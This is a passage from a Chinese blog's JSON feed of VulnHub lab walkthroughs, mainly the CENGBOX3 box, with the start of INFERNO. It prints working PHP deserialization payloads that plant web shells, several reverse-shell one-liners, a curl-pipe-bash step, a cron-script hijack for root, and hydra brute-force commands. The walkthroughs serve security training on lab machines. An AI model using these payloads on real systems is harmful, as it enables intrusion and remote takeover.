<code>vim 1.txt +&quot;:%s/\\n//g&quot; +wq</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1062.png\" width=\"620\" alt=\"Image\">\n<p>From binary 解密二进制之后得到了十六进制的如下数据</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1063.png\" width=\"620\" alt=\"Image\">\n<p>From magic 解密之后得到了 root 账户的密码  <code>root:-!F8h2LMr&lt;\\[n]'N]Kq</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1064.png\" width=\"620\" alt=\"Image\">\n<p>利用如下命令切换至 root 用户</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1065.png\" width=\"320\" alt=\"Image\">\n<p>-&gt; 成功拿到了 root 账户的权限</p>\n",
            "tags": [
                "VULNHUB 31-40"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/141%20CENGBOX3/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/141%20CENGBOX3/",
            "title": "VULNHUB 41 CENGBOX3",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvY2VuZ2JveC0zLDU3Ni8=\">https://www.vulnhub.com/entry/cengbox-3,576/</span><br>\n 教程链接地址 1: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDY4ODA1MC9hcnRpY2xlL2RldGFpbHMvMTE4MDE1OTA3\">https://blog.csdn.net/weixin_50688050/article/details/118015907</span><br>\n 教程链接地址 2: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc3ltOTQ1L3AvMTQzMDM3MjguaHRtbA==\">https://www.cnblogs.com/sym945/p/14303728.html</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 CENGBOX3：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>确定靶机 ip 地址和开放的端口<br>\n由已至内网靶机所在主机 MAC 地址自动扫描靶机服务<br>\n <code>sudo arp-scan -l | grep 'a0' | awk '&#123;print $1,$2&#125;' | cut -d ' ' -f 1 | xargs sudo nmap -PA</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1121.png\" width=\"620\" alt=\"Image\">\n<p>-&gt; 靶机 ip：192.168.31.25 靶机开放端口 22,80,443</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuOTYv\">http://192.168.31.96/</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1122.png\" width=\"620\" alt=\"Image\">\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cHM6Ly8xOTIuMTY4LjMxLjk2Lw==\">https://192.168.31.96/</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1123.png\" width=\"620\" alt=\"Image\">\n<p>点击隐藏详情，输入 thisisunsafe 即可进入该站点</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1124.png\" width=\"620\" alt=\"Image\">\n<p>扫描目录:<br>\n <code>gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory- list-2.3-medium.txt -u http://192.168.31.96/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1125.png\" width=\"660\" alt=\"Image\">\n<p>没有找到有价值的目标，得去尝试一下 443 端口的网站有没有什么敏感目录  <code>gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://192.168.31.96/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1126.png\" width=\"700\" alt=\"Image\">\n<h3 id=\"nmamp-端口扫描\"><a class=\"markdownIt-Anchor\" href=\"#nmamp-端口扫描\">#</a> nmamp 端口扫描</h3>\n<blockquote>\n<p>发现 gobuster 无法爆破此类网址，只能另寻它法，按理说 web 站点必有破绽才能进一步渗透，但是现在的 web 没有任何的突破口，是不是我们从端口扫描那里就出现了问题这次通过 - A 参数详细的扫描一波端口信息，看能否获得更多的信息</p>\n</blockquote>\n<p><code>sudo nmap -A -p- 192.168.31.96</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1127.png\" width=\"660\" alt=\"Image\">\n<p>发现了一个 ceng-company.vm 的字样，这个可以做为 hosts 做 DNS 解析，修改本地 hosts 文件，将此域名的 DNS 解析指向 ip 地址</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1128.png\" width=\"260\" alt=\"Image\">\n<p>解析成功了，可以直接访问这个域名了，接下来就对这个域名做测试</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1129.png\" width=\"620\" alt=\"Image\">\n<p>首先就是测试目录，看有哪些目录  <code>gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u [http://ceng-company.vm/](http://ceng-company.vm/)</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1130.png\" width=\"700\" alt=\"Image\">\n<p>还是这几个目录，没有多大的作用，下一步对域名做一个子域名扫描</p>\n<h3 id=\"gobuster-爆破子域名\"><a class=\"markdownIt-Anchor\" href=\"#gobuster-爆破子域名\">#</a> gobuster 爆破子域名</h3>\n<p>爆破子域名的时候选用 vhost 参数，字典可以根据自己的习惯选择这里使用的是 seclists 中的一个子域名爆破字典<br>\n <code>gobuster vhost -u [http://ceng-company.vm/](http://ceng-company.vm/) -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1131.png\" width=\"570\" alt=\"Image\">\n<p>也可以选用较大的字典爆破子域名  <code>gobuster vhost -u http://ceng-company.vm/ -w /usr/share/wordlists/dirb/big.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1132.png\" width=\"620\" alt=\"Image\">\n<p>找到一个子域名，同样修改本地 hosts 文件，改变 DNS 解析指向</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1133.png\" width=\"290\" alt=\"Image\">\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovL2Rldi5jZW5nLWNvbXBhbnkudm0=\">http://dev.ceng-company.vm</span> 做信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1134.png\" width=\"620\" alt=\"Image\">\n<p>同样的先来做一波目录扫描</p>\n<p><code>gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://dev.ceng-company.vm/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1135.png\" width=\"660\" alt=\"Image\">\n<p>没有什么敏感的目录，目录扫描无法得到更多有效的线索</p>\n<h3 id=\"sqlmap-注入\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-注入\">#</a> sqlmap 注入</h3>\n<p>既然这个子域名的首页是登录框，登录框就可以尝试使用 sql 注入，通过 burp 将数据包拦截，复制该数据包</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1136.png\" width=\"520\" alt=\"Image\">\n<p>通过 sqlmap 指定发送数据为此数据包中的内容</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1137.png\" width=\"700\" alt=\"Image\">\n<p><code>sqlmap -r login.txt --batch --dbs</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1138.png\" width=\"700\" alt=\"Image\">\n<p>直接爆破的时候是失败的</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1139.png\" width=\"700\" alt=\"Image\">\n<p>指定注入点是 username 时再次尝试</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1140.png\" width=\"700\" alt=\"Image\">\n<p>指定注入点是 passwd 时再次尝试</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1141.png\" width=\"700\" alt=\"Image\">\n<p>前面几种方式都试了，试不出来此地方是存在 sql 注入的，没有找到其余人是怎么通过这个点拿到数据库的信息的，数据库中的信息如下，可通过下列两个账号登陆到后台</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1142.png\" width=\"420\" alt=\"Image\">\n<p><code>admin@ceng-company.vm：admin*_2020</code> <br>\n <code>elizabethsky@ceng-company.vm：walnuttree</code></p>\n<h3 id=\"php反序列化漏洞\"><a class=\"markdownIt-Anchor\" href=\"#php反序列化漏洞\">#</a> php 反序列化漏洞</h3>\n<p>进入比较高权限的 admin 的后台</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1143.png\" width=\"660\" alt=\"Image\">\n<p>这里有一个可以输入的地方，输入 1,2,3 尝试是否有回显</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1144.png\" width=\"660\" alt=\"Image\">\n<p>提交之后，显示发送成功，并且有一个链接可以跳转</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1145.png\" width=\"660\" alt=\"Image\">\n<p>此链接显示了 1,3 位置的数据，我们可以放一些恶意 payload 尝试</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1146.png\" width=\"520\" alt=\"Image\">\n<p>在输入框依次填写如下内容，看 phpinfo 是否会被执行</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1147.png\" width=\"660\" alt=\"Image\">\n<p>回显中并没有 phpinfo 的信息，只留下来了第三个位置的数字</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1148.png\" width=\"520\" alt=\"Image\">\n<p>把 phpinfo 放在第三个位置看看有没有什么回显</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1149.png\" width=\"620\" alt=\"Image\">\n<p>看来 phpinfo 的信息没有被执行，跟 1,3 的位置无关</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1150.png\" width=\"470\" alt=\"Image\">\n<p>查看源码里，只是以一种字符串的形势存在</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1151.png\" width=\"320\" alt=\"Image\">\n<h3 id=\"php反序列化-get\"><a class=\"markdownIt-Anchor\" href=\"#php反序列化-get\">#</a> php 反序列化 GET</h3>\n<p>仔细观察 url 地址，发现是一个 url 编码后的地址<br>\n通过在线 url 解码：<span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5hYjE3My5jb20vZW5jL3VybGVuY29kZS5waHA=\">http://www.ab173.com/enc/urlencode.php</span></p>\n<p><code>http://dev.ceng-company.vm/addpoem.php?data=O:4:&quot;Poem&quot;:3:&#123;s:8:&quot;poemName&quot;;s:1:&quot;1&quot;;s:10:&quot;isPoetrist&quot;;O:8:&quot;poemFile&quot;:2:&#123;s:8:&quot;filename&quot;;s:22:&quot;/var/www/html/poem.txt&quot;;s:8:&quot;poemName&quot;;s:1:&quot;1&quot;;&#125;s:9:&quot;poemLines&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;&#125;</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1152.png\" width=\"700\" alt=\"Image\">\n<p>发现这就是一个 php 反序列化漏洞，在我们要上传的 phpinfo 的地方出构造一 GET 方法，通过该 GET 方法调用 php 执行系统命令</p>\n<p><code>O:4:&quot;Poem&quot;:3:&#123;s:8:&quot;poemName&quot;;s:4:&quot;ada&quot;;s:10:&quot;isPoetrist&quot;;O:8:&quot;poemFile&quot;:2:&#123;s:8:&quot;filename&quot;;s:22:&quot;/var/www/html/poem.php&quot;;s:8:&quot;poemName&quot;;s:47:&quot;&lt;?php echo shell_exec($_GET['cmd'].' 2&gt;&amp;1'); ?&gt;&quot;;&#125;s:9:&quot;poemLines&quot;;s:4:&quot;adadd&quot;;&#125;</code></p>\n<p>表示往主站 poem.php 写入一个 cmd 的 GET 方法，方法中的内容用系统执行</p>\n<p>将此内容进行 url 编码后添加到 <span class=\"exturl\" data-url=\"aHR0cDovL2Rldi5jZW5nLWNvbXBhbnkudm0vYWRkcG9lbS5waHA/ZGF0YT0=\">http://dev.ceng-company.vm/addpoem.php?data=</span> 执行之后没有报错，poem.php 文件写入成功</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1153.png\" width=\"660\" alt=\"Image\">\n<p>执行 id 方法，输出 id 的一些信息</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1154.png\" width=\"440\" alt=\"Image\">\n<p>查看 ifconfig 的 ip 信息时，通过查看源代码也能很方便的看到</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1155.png\" width=\"620\" alt=\"Image\">\n<p>现在这个地方已经被升级成为了 RCE 命令执行漏洞，查看服务器有下列哪些反弹 shell 的命令</p>\n<p><code>http://ceng-company.vm/poem.php?cmd=which%20python;which%20nc;which%20curl;which%20wget;which%20php</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1156.png\" width=\"660\" alt=\"Image\">\n<p>发现存在 nc，curl，wget，php 可以依次尝试使用反弹 shell 的命令</p>\n<h3 id=\"反弹shell总结\"><a class=\"markdownIt-Anchor\" href=\"#反弹shell总结\">#</a> 反弹 shell 总结</h3>\n<p><code>nc 192.168.31.84 4445 -e /bin/bash</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1157.png\" width=\"660\" alt=\"Image\">\n<p><code>bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.31. 84 /444 5 0&gt;&amp;1'</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1158.png\" width=\"660\" alt=\"Image\">\n<p><code>bash -i &gt;&amp; /dev/tcp/192.168.31. 84 /444 5 0&gt;&amp;1</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1159.png\" width=\"660\" alt=\"Image\">\n<p><code>php -r '$sock=fsockopen(&quot;192.168.31. 84 &quot;,444 5 );exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1160.png\" width=\"660\" alt=\"Image\">\n<p>如果有服务器的话，可以直接接服务器的马执行，这里我没有开启远程公网 ip 上的服务器，就直接在本地开了一个简易的 web</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在 192.168.31.25的机器上</span></span><br><span class=\"line\">cat &gt; shell.sh &lt;&lt; EOF</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">! /bin/bash</span></span><br><span class=\"line\">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.31.84/4444 0&gt;&amp;1&#x27;</span><br><span class=\"line\">EOF</span><br><span class=\"line\">python 3 -m httpserver 80</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在 192.168.31. 84 的机器上</span></span><br><span class=\"line\">nc - lvvp 4444</span><br></pre></td></tr></table></figure>\n<p>通过网站去执行：curl <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjUvc2hlbGwuc2g=\">http://192.168.31.25/shell.sh</span> | bash<br>\n 表示加载 shell.sh 的内容之后用 bash 去执行</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1161.png\" width=\"660\" alt=\"Image\">\n<p>最后通过 curl 的方式拿到了 webshell，利用相关代码进行标准 shell 的输出</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1162.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"php反序列化-post\"><a class=\"markdownIt-Anchor\" href=\"#php反序列化-post\">#</a> php 反序列化 POST</h3>\n<p>既然我们可以通过 GET 型的注入升级为 RCE，看看有没有其他的方法，先搞一个简单的 phpinfo 给指定路径上传 phpinfo 进行执行</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1163.png\" width=\"700\" alt=\"Image\">\n<p><code>O:4:&quot;Poem&quot;:3:&#123;s:8:&quot;poemName&quot;;s:3:&quot;aba&quot;;s:10:&quot;isPoetrist&quot;;O:8:&quot;poemFile&quot;:2:&#123;s:8:&quot;filename&quot;;s:18:&quot;/var/www/html/x.php&quot;;s:8:&quot;poemName&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;&#125;s:9:&quot;poemLines&quot;;s:3:&quot;aba&quot;;&#125;</code></p>\n<p>意指往主站 x.php 上打印一个<?php phpinfo();?>的记录</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1164.png\" width=\"700\" alt=\"Image\">\n<p>url 编码后去执行这个 x.php，回显出来了 phpinfo 的信息</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1165.png\" width=\"660\" alt=\"Image\">\n<p>用 post 型参数，上传一句话后门到主站的 y.php</p>\n<p><code>O:4:&quot;Poem&quot;:3:&#123;s:8:&quot;poemName&quot;;s:3:&quot;aba&quot;;s:10:&quot;isPoetrist&quot;;O:8:&quot;poemFile&quot;:2:&#123;s:8:&quot;filename&quot;;s:19:&quot;/var/www/html/y.php&quot;;s:8:&quot;poemName&quot;;s:27:&quot;&lt;?php @eval($_POST['x']);?&gt;&quot;;&#125;s:9:&quot;poemLines&quot;;s:3:&quot;aba&quot;;&#125;</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1166.png\" width=\"700\" alt=\"Image\">\n<p>url 编码后通过 url 执行，成功写到网站根目录上</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1167.png\" width=\"700\" alt=\"Image\">\n<p>POST 型木马可以通过蚁剑等工具直接链接，地址是主站的 y.php，密码是 x</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1168.png\" width=\"660\" alt=\"Image\">\n<p>通过写如下新文件，将服务器的 shell 反弹出来<br>\n <code>&lt;?php system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.31.84 4445 &gt;/tmp/f&quot;);?&gt;</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1169.png\" width=\"700\" alt=\"Image\">\n<blockquote>\n<p>指的是如果存在命名管道 /tmp/f 先删掉它，然后新建一个命名管道 /tmp/f<br>\n 并且通过 cat 往命名管道中打印 /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.31.84 4445 这个命令<br>\n /bin/sh -i 2&gt;&amp;1|nc 192.168.31.84 4445 表示用 sh 强制交互式执行并将输出<br>\n结果重定向，然后将输出内容反弹到 192.168.31.84 的 4445 端口上</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1170.png\" width=\"440\" alt=\"Image\">\n<p>对终端进行调整，输出一个较为美观的终端</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1171.png\" width=\"420\" alt=\"Image\">\n<h3 id=\"php反序列化-mkfifo\"><a class=\"markdownIt-Anchor\" href=\"#php反序列化-mkfifo\">#</a> php 反序列化 mkfifo</h3>\n<p>既然可以通过 POST 间接的使用 mkfifo 注入 RCE，那么是否可以直接在 php 反序列化里边直接上传 mkfifo 的命令反弹 shell 呢，尝试一下</p>\n<p><code>O:4:&quot;Poem&quot;:3:&#123;s:8:&quot;poemName&quot;;s:3:&quot;aba&quot;;s:10:&quot;isPoetrist&quot;;O:8:&quot;poemFile&quot;:2:&#123;s:8:&quot;filename&quot;;s:19:&quot;/var/www/html/z.php&quot;;s:8:&quot;poemName&quot;;s:100:&quot;&lt;?php system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.31.135 4444 &gt;/tmp/f&quot;);?&gt;&quot;;&#125;s:9:&quot;poemLines&quot;;s:3:&quot;aba&quot;;&#125;</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1172.png\" width=\"700\" alt=\"Image\">\n<p>提示上传成功了，但是在 z.php 执行的时候失败的，这种方法可能被过滤掉了，因此目前只有通过注入 GET 参数，在 url 界面使用 curl 反弹或者注入 POST 参数，在蚁剑中用 mkfifo 的方式反弹</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1173.png\" width=\"700\" alt=\"Image\">\n<h3 id=\"tcpdump抓取数据包\"><a class=\"markdownIt-Anchor\" href=\"#tcpdump抓取数据包\">#</a> tcpdump 抓取数据包</h3>\n<p>对 webshell 做一个 pspy 监控看有没有定时任务</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1174.png\" width=\"520\" alt=\"Image\">\n<p>追踪定期执行的任务 /opt/login.py, 只有拿到 eric 的权限才能查看</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1175.png\" width=\"330\" alt=\"Image\">\n<p>既然是登陆的脚本，肯定是有数据传送的，看了一下服务器上是存在 tcpdump 的，可以借用这个工具来监视数据包的传输，说不定能在数据包里有发现  <code>tcpdump -i lo -w login.pcapng</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1176.png\" width=\"540\" alt=\"Image\">\n<p>抓了大概三分钟的数据之后将 login.pcapng 发送至 kali 上目标 webshell 上不存在 scp 命令也无法通过 python 的简易 web 打开</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1177.png\" width=\"480\" alt=\"Image\">\n<p>就将这个文件移动到了 /var/www/html 中</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1178.png\" width=\"520\" alt=\"Image\">\n<p>直接通过浏览器打开这个文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1179.png\" width=\"660\" alt=\"Image\">\n<p>页面中存在着 eric 的用户名和密码 <code>3ricThompson%2ACovid19</code> ，但是后面还有一些奇怪的字符，不足以确定密码是多少，还是下载下来分析一番</p>\n<h3 id=\"uid0的定时任务反弹\"><a class=\"markdownIt-Anchor\" href=\"#uid0的定时任务反弹\">#</a> UID=0 的定时任务反弹</h3>\n<p>用 kali 机器下载此文件，用 strings 分析，得到了 <code>3ricThompson%2ACovid19</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1180.png\" width=\"420\" alt=\"Image\">\n<p>但是 %2A 出现在这个密码中很突兀，可能是编码原因导致原来的特殊符号在数据传输过程中发生了转码，解码之后得到其是 *</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1181.png\" width=\"320\" alt=\"Image\">\n<p>用下列两个方式尝试登陆服务器拿到了 eric 的权限<br>\n <code>eric: 3ricThompson%2ACovid19</code>   <code>eric: 3ricThompson*Covid19</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1182.png\" width=\"420\" alt=\"Image\">\n<p>找到 login.py 看到漏洞形成的原因就是因为其往本地发送了一些登陆的数据包</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1183.png\" width=\"410\" alt=\"Image\">\n<p>在 /opt 下还有两个文件是跟 root 账户相关的，<span class=\"exturl\" data-url=\"aHR0cDovL2NoZWNoLnhuLS1zaHdoYXRpc215aXAtZGUwdTMyM2dxcXRxMG4ybDVsLnB5\">chech.sh 就是去执行 whatismyip.py</span>，而 whatismyip.py 就是得到公网 ip</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1184.png\" width=\"340\" alt=\"Image\">\n<p>通过 pspy 监控，发现定期执行的 login.py 是用 UID=0 的用即 root 权限执行的</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1185.png\" width=\"550\" alt=\"Image\">\n<p>eric 用户有对 login.py 的改写权限，改写 login.py 文件，通过 py 反弹 shell</p>\n<p><code>echo &quot;import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.31.84',4446));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash')&quot; &gt; login.py</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1186.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 最终拿到了 root 用户，</p>\n<h3 id=\"vim全屏stty\"><a class=\"markdownIt-Anchor\" href=\"#vim全屏stty\">#</a> vim 全屏 stty</h3>\n<p>但是我么去用 vim 包括使用命令的时候往往输入了一部分内容之后就不能在再同一行继续输入了，这个美观问题经常很头疼。</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1187.png\" width=\"420\" alt=\"Image\">\n<blockquote>\n<p>可以重设 stty 的大小，来将反弹得到的 shell 按照自己的 shell 的 stty 来标准化，自己当前的 stty 有多大就将其改为多大<br>\n通过 python 先输出一个标准的 shell  <code>python3 -c &quot;import pty;pty.spawn('/bin/bash')&quot;</code> <br>\n 输入 ctrl+z 让其后台运行<br>\n查看自己当前开启的终端的大小  <code>stty - a</code></p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1188.png\" width=\"520\" alt=\"Image\">\n<blockquote>\n<p>设置 stty 为 raw 模式，并前台启动后台运行的程序 <code>stty raw -echo;fg</code> <br>\n 并输入回车两次<br>\n输入 reset 重置 stty，如提示找不到 terminal 的类型，就设置为 xterm</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1189.png\" width=\"380\" alt=\"Image\">\n<p>根据查到的终端大小设置反弹 shell 的终端的 stty <code>stty rows 25 columns 79</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1190.png\" width=\"300\" alt=\"Image\">\n<p>现在我们所使用的终端就比较工整了，vim 也能全屏使用了</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1191.png\" width=\"470\" alt=\"Image\">\n",
            "tags": [
                "VULNHUB 41-50"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/139%20INFERNO/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/139%20INFERNO/",
            "title": "VULNHUB 39 INFERNO",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaW5mZXJuby0xMSw2MDMv\">https://www.vulnhub.com/entry/inferno-11,603/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MDY4ODA1MC9hcnRpY2xlL2RldGFpbHMvMTE5OTAyNzM1\">https://blog.csdn.net/weixin_50688050/article/details/119902735</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 INFERNO：桥接于 192.168.31.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址和开放的端口<br>\n由已至内网靶机所在主机 MAC 地址自动扫描靶机服务<br>\n <code>sudo arp-scan -l | grep 'a0' | awk '&#123;print $1,$2&#125;' | cut -d ' ' -f 1 | xargs sudo nmap -PA</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1066.png\" width=\"580\" alt=\"Image\">\n<p>-&gt; 靶机 ip：192.168.31.25 靶机开放端口 22,80</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjUv\">http://192.168.31.25/</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1067.png\" width=\"660\" alt=\"Image\">\n<p>目录扫描 <code>gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.25/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1068.png\" width=\"520\" alt=\"Image\">\n<p>发现了一个敏感的地址，进入后需要发现认证:<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMjUvaW5mZXJubw==\">http://192.168.31.25/inferno</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1069.png\" width=\"520\" alt=\"Image\">\n<p>也没有别的办法了，只能对这个页面进行爆破用户名和密码</p>\n<h3 id=\"hydra-爆破网站后台\"><a class=\"markdownIt-Anchor\" href=\"#hydra-爆破网站后台\">#</a> hydra 爆破网站后台</h3>\n<p>利用 hydra 选取合适的用户名字典进行爆破<br>\n <code>hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt 192.168.31.2 5 -f http-get /inferno/ -t 64 -f -vV -o hydra.ssh</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1070.png\" width=\"660\" alt=\"Image\">\n<p>这个爆破时间是比较长的，每一个用户名都要匹配几百万次，是非常慢的因为大部分网站的用户名都是 admin，此处我们直接用 admin 爆破，可以简化很多事情，但是每一次只能爆破 64 个，速度也是不容乐观的<br>\n <code>hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.31.221 -f http-get /inferno/ -t 64 -f -vV -o hydra.ssh</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1071.png\" width=\"660\" alt=\"Image\">\n<p>等待大概两三个小时差不多就出结果了</p>\n<blockquote>\n<p>凭借 admin:dante1 可进入网站第一层认证结束之后，还有第二层认证，但是好在第一层和第二层的用户名和密码是相同的输入 admin:dante1 后成功进入网站后台</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1072.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"文件上传尝试\"><a class=\"markdownIt-Anchor\" href=\"#文件上传尝试\">#</a> 文件上传尝试</h3>\n<p>这是一些 php 的源码文件，代码审计后没有发现突破口</p>\n<img 